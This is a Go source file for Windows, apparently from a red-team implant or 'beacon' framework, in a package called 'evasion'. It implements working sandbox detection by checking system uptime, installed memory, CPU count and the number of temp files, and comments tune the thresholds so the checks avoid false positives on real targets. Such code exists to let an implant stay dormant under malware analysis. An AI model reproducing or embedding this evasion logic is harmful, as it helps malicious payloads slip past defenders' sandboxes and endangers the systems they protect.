//go:build windows

package evasion

import (
	"os"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

func SandboxDetected() bool {
	if uptimeTooShort() {
		return true
	}
	if physicalMemoryTooSmall() {
		return true
	}
	if cpuCountTooLow() {
		return true
	}
	if tempFileCountTooLow() {
		return true
	}
	return false
}

// uptimeTooShort: 90 seconds. See antisandbox_linux.go for the
// rationale — higher thresholds false-positive on freshly-provisioned
// engagement VMs.
func uptimeTooShort() bool {
	kernel := syscall.NewLazyDLL("Kernel32.dll")
	getTickCount := kernel.NewProc("GetTickCount64")
	r, _, _ := getTickCount.Call()
	if r == 0 {
		return false
	}
	// NOTE: on 386 and arm (32-bit) builds, uintptr is 4 bytes and
	// the upper half of the ULONGLONG return value is discarded. On
	// those platforms the check is only correct for the first 49.7
	// days of uptime; past that the low half wraps and the result is
	// meaningless. Windows 32-bit beacons are rare enough that this
	// trade-off is acceptable, but do not rely on the check on those
	// builds.
	uptime := time.Duration(r) * time.Millisecond
	return uptime < 90*time.Second
}

// physicalMemoryTooSmall: 2 GB. 4 GB catches legitimate thin clients,
// VDI instances, and small cloud VMs.
func physicalMemoryTooSmall() bool {
	kernel := syscall.NewLazyDLL("kernel32.dll")
	proc := kernel.NewProc("GetPhysicallyInstalledSystemMemory")
	var memKB uint64
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&memKB)))
	if ret == 0 {
		return false
	}
	memGB := memKB / 1048576
	return memGB < 2
}

// cpuCountTooLow: 1 vCPU. See antisandbox_linux.go.
func cpuCountTooLow() bool {
	return runtime.NumCPU() < 2
}

// tempFileCountTooLow: 5 files. See antisandbox_linux.go.
func tempFileCountTooLow() bool {
	temp := os.Getenv("TEMP")
	if temp == "" {
		temp = os.TempDir()
	}
	count := 0
	_ = filepath.Walk(temp, func(_ string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !fi.IsDir() {
			count++
		}
		return nil
	})
	return count < 5
}

// sleepPatched removed. See antisandbox_linux.go for the rationale.